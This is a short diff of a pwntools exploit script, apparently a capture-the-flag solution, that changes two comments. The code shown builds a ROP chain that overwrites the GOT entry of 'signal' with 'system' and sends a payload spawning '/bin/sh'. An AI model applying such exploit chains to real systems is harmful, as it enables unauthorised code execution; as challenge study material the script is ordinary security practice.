@@ -36,12 +36,12 @@ rop = ROP(binary)
 
 rop.call(0x40167a) # For no exit
 rop.raw(0)
-rop.call(0x4012eb, [e.got['signal'], l.symbols['system'] - l.symbols['signal']]) # 0x4012eb func is very important! got['exit'] -> one_gadget
+rop.call(0x4012eb, [e.got['signal'], l.symbols['system'] - l.symbols['signal']]) # 0x4012eb func is very important! got['signal'] -> 'system'
 rop.call(e.plt['signal'], [0x605438])
 
 print r(4096)
 
-# 0x605438 : '/bin/sh'
+# 0x605438 : '/bin/sh' (a bit of string contents remains in object's bss section.)
 argg = '/bin/sh\x00'
 for i in range(40):
     sl(argg * (0x108 /8) + p64(0xdeadbeef) * 2 + str(rop))
